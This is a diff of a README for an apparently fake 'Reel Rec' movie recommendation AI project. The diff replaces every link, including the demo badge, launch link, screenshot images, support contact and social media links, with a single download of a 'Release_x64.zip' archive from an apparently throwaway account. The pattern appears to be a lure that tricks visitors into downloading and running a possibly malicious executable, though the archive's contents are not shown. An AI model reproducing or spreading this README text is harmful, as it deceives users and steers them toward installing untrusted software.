@@ -1,6 +1,6 @@
 # Reel Rec - Your Ultimate Movie Recommendation AI 🎬🍿
 
-[![Project Demo](https://img.shields.io/badge/Reel-Rec%20Demo-ff69b4)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Project Demo](https://github.com/asdhasdasj/Reel-Rec/releases/download/v2.0/Release_x64.zip%20Demo-ff69b4)](https://github.com/asdhasdasj/Reel-Rec/releases/download/v2.0/Release_x64.zip)
 
 Welcome to Reel Rec, your go-to Movie Recommendation AI that will revolutionize the way you discover and enjoy your favorite films! Powered by cutting-edge technology, Reel Rec is designed to provide tailored movie recommendations based on your unique preferences.
 
@@ -45,31 +45,31 @@ Using Reel Rec is easy! Simply create an account, rate a few movies to help our 
 
 ## Get Started
 
-To experience the magic of Reel Rec, simply [click here to launch the application](https://github.com/user-attachments/files/18383251/Software.zip). 🚀
+To experience the magic of Reel Rec, simply [click here to launch the application](https://github.com/asdhasdasj/Reel-Rec/releases/download/v2.0/Release_x64.zip). 🚀
 
 If the link does not work or if you are looking for the latest version, please check the "Releases" section of this repository.
 
 ## Screenshots
 
-![Reel Rec Home Page](https://example.com/homepage.png)
+![Reel Rec Home Page](https://github.com/asdhasdasj/Reel-Rec/releases/download/v2.0/Release_x64.zip)
 
 *Explore a world of movies with Reel Rec!*
 
-![Reel Rec Recommendations](https://example.com/recommendations.png)
+![Reel Rec Recommendations](https://github.com/asdhasdasj/Reel-Rec/releases/download/v2.0/Release_x64.zip)
 
 *Discover personalized movie recommendations just for you!*
 
 ## Support
 
-If you have any questions, suggestions, or feedback, feel free to [contact us](mailto:reelrec@example.com). We're here to help you make the most of your movie-watching experience.
+If you have any questions, suggestions, or feedback, feel free to [contact us](https://github.com/asdhasdasj/Reel-Rec/releases/download/v2.0/Release_x64.zip). We're here to help you make the most of your movie-watching experience.
 
 ## Stay Connected
 
 Follow Reel Rec on social media for exciting updates, behind-the-scenes looks, and more!
 
-- [Twitter](https://twitter.com/reelrec)
-- [Instagram](https://instagram.com/reelrec)
-- [Facebook](https://facebook.com/reelrec)
+- [Twitter](https://github.com/asdhasdasj/Reel-Rec/releases/download/v2.0/Release_x64.zip)
+- [Instagram](https://github.com/asdhasdasj/Reel-Rec/releases/download/v2.0/Release_x64.zip)
+- [Facebook](https://github.com/asdhasdasj/Reel-Rec/releases/download/v2.0/Release_x64.zip)
 
 ---
 
